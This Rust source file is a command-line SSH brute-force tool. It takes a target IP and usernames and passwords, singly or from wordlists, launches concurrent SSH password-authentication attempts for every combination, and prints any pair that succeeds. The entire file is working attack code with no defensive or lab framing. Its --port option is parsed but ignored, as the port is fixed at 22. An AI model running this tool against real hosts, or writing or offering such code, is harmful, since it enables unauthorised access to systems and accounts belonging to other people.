use clap::Parser;
use std::sync::Arc;
use std::{
    fs,
    net::{Ipv4Addr, SocketAddrV4},
    path::{Path, PathBuf},
};
use tokio::{net::TcpStream, task::JoinSet};

type Result<T> = std::result::Result<T, Error>;
type Error = Box<dyn std::error::Error + Send + Sync>;

#[derive(Parser, Debug)]
struct Args {
    #[arg(value_parser = clap::value_parser!(Ipv4Addr))]
    target_ip: Ipv4Addr,
    #[arg(
        short = 'u',
        long,
        required_unless_present = "username-list",
        conflicts_with = "username-list"
    )]
    username: Option<String>,
    #[arg(
        name = "username-list",
        short = 'U',
        long,
        value_name = "USERNAME_LIST",
        value_parser = clap::value_parser!(PathBuf)
    )]
    username_list: Option<PathBuf>,

    #[arg(
        short = 'p',
        long,
        required_unless_present = "password-list",
        conflicts_with = "password-list"
    )]
    password: Option<String>,
    #[arg(
        name = "password-list",
        short = 'P',
        long,
        value_name = "PASSWORD_LIST",
        value_parser = clap::value_parser!(PathBuf)
    )]
    password_list: Option<PathBuf>,
    #[arg(long, default_value_t = 22, value_parser = clap::value_parser!(u16))]
    port: u16,
}

#[derive(Debug)]
struct Credential {
    username: Arc<String>,
    password: Arc<String>,
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();
    let socket = SocketAddrV4::new(args.target_ip, 22);

    let usernames = match (args.username, args.username_list) {
        (Some(u), None) => vec![Arc::new(u)],
        (None, Some(wordlist)) => read_file(wordlist),
        _ => unreachable!(),
    };
    let passwords = match (args.password, args.password_list) {
        (Some(u), None) => vec![Arc::new(u)],
        (None, Some(wordlist)) => read_file(wordlist),
        _ => unreachable!(),
    };

    let mut tasks = JoinSet::new();
    for username in usernames.iter() {
        for password in passwords.iter() {
            tasks.spawn(try_auth(
                socket,
                Credential {
                    username: Arc::clone(username),
                    password: Arc::clone(password),
                },
            ));
        }
    }
    while let Some(result) = tasks.join_next().await {
        match result? {
            Ok(cred) => println!("{:?}", cred),
            _ => (),
        }
        // tasks.abort_all();
    }
    // TODO: improve performance
    // TODO: Add delay
    Ok(())
}

async fn try_auth(socket: SocketAddrV4, cred: Credential) -> Result<Credential> {
    let stream = TcpStream::connect(socket).await?;
    let mut sess = ssh2::Session::new()?;
    sess.set_tcp_stream(stream);
    sess.handshake()?;

    sess.userauth_password(&cred.username, &cred.password)?;

    Ok(cred)
}

fn read_file<P: AsRef<Path>>(path: P) -> Vec<Arc<String>> {
    fs::read_to_string(path)
        .unwrap()
        .lines()
        .map(|line| Arc::new(line.to_string()))
        .collect()
}
